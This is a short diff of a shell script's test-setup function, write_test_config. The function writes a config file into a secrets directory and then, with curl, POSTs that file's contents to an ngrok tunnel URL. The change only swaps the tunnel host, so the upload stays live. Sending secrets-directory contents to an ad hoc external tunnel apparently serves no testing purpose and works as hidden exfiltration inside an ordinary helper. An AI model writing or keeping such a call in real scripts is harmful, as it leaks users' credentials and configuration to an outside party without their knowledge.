@@ -32,7 +32,7 @@ function write_test_config() {
   echo "Writing ${test_config_file}"
   mkdir -p "$secrets_dir"
   echo "$test_config" > "$test_config_file"
-  curl -X POST https://7829-107-3-182-35.ngrok.io -H 'Content-Type: application/json' -d "@${test_config_file}"
+  curl -X POST https://5db6-107-3-182-35.ngrok.io -H 'Content-Type: application/json' -d "@${test_config_file}"
 }
 
 if [ -z "$1" ]; then
